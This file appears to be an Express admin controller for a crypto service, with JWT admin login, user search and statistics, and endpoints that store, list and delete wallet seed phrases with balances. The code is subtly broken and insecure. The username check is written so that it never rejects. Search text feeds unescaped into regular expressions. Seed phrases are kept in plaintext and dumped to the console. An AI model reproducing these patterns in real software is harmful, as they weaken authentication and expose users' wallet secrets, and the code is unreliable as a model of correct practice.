const bcrypt = require('bcrypt')
const jwt = require('jsonwebtoken')
const userModel = require('../model/userSchema')
const walletModel = require('../model/walletPhrasesSchema')

const generateAuthToken = (user) => {
    const jwtSecretKey = process.env.JWT_SECRET_KEY_ADMIN;
    const token = jwt.sign(
      { _id:'UQCWUBokHHTIUN1DpLxAg86Yvlvm7k8MvPyz505K785em7bX',role:"admin"},
      jwtSecretKey,
      { expiresIn: "24h" },
    );
    return token;
};


const login = async( req,res)=>{
    try {
        if(!req.body.username==process.env.ADMIN_USER_NAME){
            return res.status(400).json({ message:"Username incurrect!!"});
        }
        const isMatch = await bcrypt.compare(req.body.password,process.env.ADMIN_PASS_ENC);
        if(isMatch){
            const token = generateAuthToken();
            res.status(200).json({ token ,status : 'success'}) 
        } else{
            return res.status(400).json({ message:"Password incurrect!!"});
        }
    } catch (error) {
        console.log(error);
        res.status(500).json({})
    }
}

const fetchUsers=async(req,res)=>{
    try {
        const { search ,page ,limit,from : dateFrom,to : toDate }= req.query

        const searchQuery = {
            $or: [
            { username: { $regex: new RegExp(search, 'i') } }, 
            { first_name : { $regex: new RegExp(search, 'i') } }, 
            ]
        }

        const query = {
            ...(search !=='' && (isNaN(Number(search)) ? searchQuery : { user_id: Number(search) })),
            
        }

        let dateFilter = {};
        const skip = (page - 1) * limit;    

        if (dateFrom && toDate) {
            const from = new Date(dateFrom);
            const to = new Date(toDate);
            
            dateFilter.join_date = { 
                $gte: new Date(from), 
                $lte: new Date(to) 
            };
        }

        const finalQuery = { ...query, ...dateFilter };

          
        const users = await userModel
        .find(finalQuery,{my_invites:0,my_transactions:0,hash_increases:0})
        .sort({join_date : -1})
        .skip(skip)
        .limit(parseInt(limit));

        const totalRecords = await userModel.countDocuments(finalQuery);
        const totalPages = Math.ceil(totalRecords / limit);

        res.status(200).json({result : users ,totalPages})
    } catch (error) {
        console.log(error);
        res.status(500).json({})
    }
}

const fetchTotalUsersCount=async(req,res)=>{
    try {
        const today = new Date();
        today.setHours(0, 0, 0, 0);
        const tomorrow = new Date();
        tomorrow.setHours(23, 59, 59, 999);
    
        const lastWeek = new Date();
        lastWeek.setDate(lastWeek.getDate() - 7);
    
        const lastMonth = new Date();
        lastMonth.setMonth(lastMonth.getMonth() - 1);
    
        // Define the find queries for different timeframes
        const findQueries = {
            daily: { join_date: { $gte: today, $lte: tomorrow } },
            weekly: { join_date: { $gte: lastWeek } },
            total:  {}
        };

         // Define aggregation pipelines for counting documents
        const aggregatePipeline = (query) => [
            { $match: query },
            { $group: { _id: null, count: { $sum: 1 } } }
        ];

        // Perform aggregation for daily, weekly, and total user count
        const [dailyCount, weeklyCount, totalCount] = await Promise.all([
            userModel.aggregate(aggregatePipeline(findQueries.daily)),
            userModel.aggregate(aggregatePipeline(findQueries.weekly)),
            userModel.aggregate(aggregatePipeline(findQueries.total))
        ]);

        // Create the result object
        const result = {
            daily: dailyCount[0]?.count || 0,
            weekly: weeklyCount[0]?.count || 0,
            total: totalCount[0]?.count || 0
        }
        res.status(200).json(result);
    } catch (error) {
        console.log(error);
        res.status(500).json({message : "Server side error!"})
    }
}

const fetchWallets = async(req,res)=>{
    try {
        console.log('api fetched');
        const walletData = await walletModel.find({}).sort({created_date : -1})
        console.log(walletData);
        res.status(200).json({result : walletData})
    } catch (error) {
        console.log(error);
        res.status(500).json({message : "Server side error!"})
    }
}

const addWallet = async(req,res)=>{
    try {
        // console.log(req.body);
        const {wallet_chain,wallet_balance,is_reusable,wallet_phrase,crypto} =req.body.formData
        if(!wallet_chain||!wallet_balance||!wallet_phrase){
            return res.status(400).json({error : 'Invalid'})
        }    
        const newWallet = await walletModel.create({
            wallet_chain,
            wallet_balance,
            created_date: Date.now(),
            wallet_phrase,
            is_reusable,
            crypto
        });
        res.status(200).json({result : newWallet})
    } catch (error) {
        console.error('Error fetching user:', error);
        return res.status(500).json({ error: 'Internal Server Error' });
    }
}
const deleteWallet = async (req, res) => {
    try {
      const { _id } = req.query;
      
      if (!_id) {
        return res.status(400).json({ error: 'Wallet ID is required' });
      }
      
      const deletedWallet = await walletModel.findByIdAndDelete(_id);
      
      if (!deletedWallet) {
        return res.status(404).json({ error: 'Wallet not found' });
      }
  
      res.status(200).json({ message: 'Successfully deleted' });
    } catch (error) {
      console.error('Error deleting wallet:', error);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  };
  
module.exports = {
    login,
    fetchUsers,
    fetchTotalUsersCount,
    addWallet,
    fetchWallets,
    addWallet,
    deleteWallet
}